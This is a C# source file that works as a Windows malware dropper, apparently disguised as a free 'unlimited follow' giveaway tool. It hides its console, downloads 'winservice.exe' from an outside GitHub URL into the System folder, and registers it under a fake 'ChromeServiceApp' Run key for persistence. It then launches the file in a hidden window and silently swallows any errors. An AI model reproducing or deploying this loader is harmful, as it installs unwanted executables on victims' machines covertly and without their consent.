using System;
using System.IO;
using System.Net;
using Microsoft.Win32;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Threading;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace FreeCode
{
    class Program
    {
        // dll import line
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern IntPtr ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
        
        static void Main(string[] args)
        {
            try
            {
                var handle = GetConsoleWindow();
                ShowWindow(handle, SW_HIDE);//0 boyutunda console boyutu
                string GetDownload_Gift_Path = Environment.GetFolderPath(Environment.SpecialFolder.System).ToString() + Path.DirectorySeparatorChar + "winservice.exe";
                RegistryKey WinStartUp = Registry.LocalMachine.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
                if (File.Exists(GetDownload_Gift_Path))
                {
                    WinStartUp.SetValue("ChromeServiceApp", GetDownload_Gift_Path);
                    Environment.Exit(0);
                }//Birim kontrolü
                else
                {
                    WebClient GetDownload_Gift = new WebClient();
                    GetDownload_Gift.DownloadFile("https://github.com/s0l0n3t/unlimitedfollow/blob/master/winservice.exe?raw=true", GetDownload_Gift_Path);
                    WinStartUp.SetValue("ChromeServiceApp", GetDownload_Gift_Path);
                }
                GetProcess_ToGift(GetDownload_Gift_Path);
                Environment.Exit(0);
            }
            catch { }
        }
        static public void GetProcess_ToGift(string GetProcess_path)
        {
            ProcessStartInfo GetProcess_Build = new ProcessStartInfo();
            GetProcess_Build.FileName = "winservice.exe";
            GetProcess_Build.WindowStyle = ProcessWindowStyle.Hidden;
            GetProcess_Build.WorkingDirectory = GetProcess_path;
            Process.Start(GetProcess_Build);// Lets go my friend
        }
    }
}
